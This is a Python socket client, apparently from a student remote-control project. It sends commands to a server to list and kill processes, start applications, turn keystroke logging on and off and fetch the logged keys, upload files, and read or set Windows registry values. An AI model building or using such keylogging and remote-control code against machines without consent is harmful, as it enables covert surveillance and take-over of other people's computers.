import socket
import os
import time
from PIL.Image import MAXCOVERAGE, new
from dotenv import load_dotenv

load_dotenv()
SERVER_HOST = os.getenv('SERVER_HOST')
SERVER_PORT = os.getenv('SERVER_PORT')
MAX_FILE_SIZE = os.getenv('MAX_FILE_SIZE')

def getListProcess(s):
    listProcess = []
    s.sendall(b'process running')
    while True:
        data = s.recv(4096) 
        data = data.decode('utf8')
        if data == 'done':
            break
        listProcess.append(data)
    return listProcess

def killProcess(s, processId):
    s.sendall(b'kill process')
    while True:
        data = s.recv(1024)
        if data.decode('utf8') == 'Received request kill process':
            s.sendall(bytes(str(processId), 'utf8'))
            break

def getListApplication(s):
    s.sendall(b'application running')
    ret = []
    while True:
        data = s.recv(4096)
        data = data.decode('utf8')
        if data == 'done':
            break
        ret.append(data)    
    return ret

def startApplication(s, appName):
    s.sendall(b'start application')
    while True:
        data = s.recv(1024)
        if data.decode('utf8') == 'application name':
            break
    s.sendall(bytes(appName, 'utf8'))
    code = s.recv(1024)
    return code
    pass

def startKeyHook(s):
    s.sendall(b'start key hook')
    data = s.recv(1024)
    return data.decode('utf8')

def stopKeyHook(s):
    s.sendall(b'stop key hook')
    data = s.recv(1024)
    return data.decode('utf8')

def getRecordedString(s):
    s.sendall(b'get recorded string')
    data = s.recv(4096)
    return data.decode('utf8')

def sendFile(s, path):
    file = open(path)
    fileData = file.read()
    s.sendall(b'send file')
    while True:
        respone = s.recv(1024)
        if respone.decode('utf8') == 'ready to recvive':
            break
    s.sendall(bytes(fileData, 'utf8'))
    while True:
        respone = s.recv(1024)
        if respone:
            return respone.decode('utf8')

def regGetValue(s, path):
    s.sendall(b'reg get value')
    while True:
        respone = s.recv(1024)
        if respone.decode('utf8') == 'reg path':
            break
    s.sendall(bytes(path, 'utf8'))
    while True:
        respone = s.recv(int(MAX_FILE_SIZE))
        if respone:
            return respone.decode('utf8')

def regSetValue(s, path, regData):
    s.sendall(b'reg set value')
    time.sleep(0.1)
    s.sendall(bytes(path, 'utf8'))
    time.sleep(0.1)
    s.sendall(bytes(regData, 'utf8'))

if __name__ == '__main__':
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_HOST, int(SERVER_PORT)))
        regSetValue(s, 'HKEY_CURRENT_USER\\Uninstall', 'teste')